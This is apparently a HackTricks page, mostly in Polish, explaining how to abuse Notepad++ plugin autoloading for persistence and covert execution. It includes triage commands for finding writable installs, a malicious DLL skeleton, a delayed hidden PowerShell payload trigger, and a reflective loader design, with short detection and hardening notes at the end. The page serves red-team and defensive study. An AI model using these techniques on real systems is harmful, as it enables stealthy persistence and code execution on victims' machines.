# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ będzie **autoload każdy plugin DLL znaleziony w jego podfolderach `plugins`** przy uruchomieniu. Umieszczenie malicious plugin w dowolnej **zapisywalnej instalacji Notepad++** daje code execution wewnątrz `notepad++.exe` za każdym razem, gdy editor startuje, co można wykorzystać do **persistence**, ukrytego **initial execution**, albo jako **in-process loader**, jeśli editor jest uruchomiony z podwyższonymi uprawnieniami.

Od **Notepad++ 7.6+** oczekiwany układ ręcznej instalacji to **jeden podfolder na plugin** (`plugins\<PluginName>\<PluginName>.dll`). W **portable mode** (obecność `doLocalConf.xml` obok `notepad++.exe`), całe drzewo aplikacji pozostaje lokalne w tym katalogu, co często zamienia skopiowane/admin tool bundles w łatwą do zapisu przez użytkownika powierzchnię wykonania.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (zwykle wymaga admin, aby zapisać).
- Writable options for low-privileged operators:
- Użyj **portable Notepad++ build** w folderze, do którego użytkownik ma prawa zapisu.
- Skopiuj `C:\Program Files\Notepad++` do ścieżki kontrolowanej przez użytkownika (np. `%LOCALAPPDATA%\npp\`) i uruchom `notepad++.exe` stamtąd.
- Szukaj **admin tool bundles**, rozpakowanych kopii zip lub help-desk toolkits, które już zawierają `doLocalConf.xml` i znajdują się poza `Program Files`.
- Każdy plugin dostaje własny podfolder pod `plugins` i jest ładowany automatycznie przy starcie; wpisy menu pojawiają się pod **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Punkty ładowania pluginu (execution primitives)
Notepad++ oczekuje określonych **exported functions**. Wszystkie są wywoływane podczas inicjalizacji, dając wiele powierzchni wykonania:
- **`DllMain`** — uruchamia się natychmiast przy załadowaniu DLL (pierwszy punkt wykonania).
- **`setInfo(NppData)`** — wywoływana raz przy ładowaniu, aby przekazać uchwyty Notepad++; typowe miejsce do rejestracji pozycji menu.
- **`getName()`** — zwraca nazwę pluginu pokazywaną w menu.
- **`getFuncsArray(int *nbF)`** — zwraca komendy menu; nawet jeśli jest pusta, jest wywoływana podczas startu.
- **`beNotified(SCNotification*)`** — odbiera zdarzenia Notepad++ / Scintilla (przydatne do odraczania payloads do czasu działania użytkownika lub zdarzenia edytora).
- **`messageProc(UINT, WPARAM, LPARAM)`** — handler wiadomości, przydatny do większych wymian danych.
- **`isUnicode()`** — flaga zgodności sprawdzana przy ładowaniu.

Większość exportów można zaimplementować jako **stubs**; execution może nastąpić z `DllMain` lub dowolnego callbacka powyżej podczas autoload.

## Minimal malicious plugin skeleton
Skompiluj DLL z oczekiwanymi exportami i umieść go w `plugins\\MyNewPlugin\\MyNewPlugin.dll` w zapisywalnym folderze Notepad++:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Zbuduj DLL (Visual Studio/MinGW).
2. Utwórz podfolder pluginu w `plugins` i umieść w nim DLL.
3. Uruchom ponownie Notepad++; DLL jest ładowana automatycznie, wykonując `DllMain` oraz kolejne callbacki.

## Low-noise trigger pattern via `beNotified`
Dla OPSEC wiele payloadów nie powinno uruchamiać się z `DllMain`. Ciszy wzorzec to pozwolić pluginowi załadować się poprawnie, a następnie wykonać kod dopiero po realistycznym zdarzeniu edytora, takim jak **startup complete**, **buffer activation** albo **pierwszy wpisany znak**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
This matches public offensive research better than a noisy `DllMain` beacon: the DLL is still autoloaded at startup, but the malicious action is delayed until Notepad++ looks genuinely in use.

## Using the plugin config directory as secondary storage
Notepad++ exposes `NPPM_GETPLUGINSCONFIGDIR`, which returns the **current user's plugin configuration directory**. A malicious plugin can use this to keep the on-disk DLL minimal while storing encrypted config, staged payloads, or tasking files in a path that blends in with normal plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operacyjnie jest to przydatne, gdy chcesz:
- mały bootstrap DLL ładowany automatycznie;
- tasking per-user bez ponownego dotykania głównego binarium pluginu;
- oddzielenie **autoload trigger** od cięższego drugiego etapu.

## Reflective loader plugin pattern
Uzbrojony plugin może zamienić Notepad++ w **reflective DLL loader**:
- Udostępnij minimalny UI/menu entry (np. "LoadDLL").
- Akceptuj **file path** lub **URL** do pobrania payload DLL.
- Reflectively mapuj DLL do bieżącego procesu i wywołaj eksportowany punkt wejścia (np. funkcję loadera wewnątrz pobranego DLL).
- Korzyść: ponownie wykorzystujesz wyglądający na benign GUI process zamiast uruchamiać nowy loader; payload dziedziczy integralność `notepad++.exe` (w tym elevated contexts).
- Trade-offs: wrzucenie na dysk **unsigned plugin DLL** jest głośne; praktycznym wariantem jest użycie autoloaded plugin tylko jako stub i trzymanie właściwego implant zaszyfrowanego / staged gdzie indziej.

## Detection and hardening notes
- Blokuj lub monitoruj **writes to Notepad++ plugin directories** (w tym portable copies w profilach użytkowników); włącz controlled folder access lub application allowlisting.
- Alarmuj na **new unsigned DLLs** w `plugins`, zmiany w portable Notepad++ trees oraz nietypową **child processes/network activity** z `notepad++.exe`.
- Ustal baseline legalnych pluginów i badaj każdy nowy DLL, który eksportuje normalny Notepad++ plugin interface, ale dodatkowo uruchamia shell, PowerShell lub network beacons.
- Wymuszaj instalację pluginów wyłącznie przez **Plugins Admin** i ogranicz uruchamianie portable copies z niezaufanych ścieżek.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
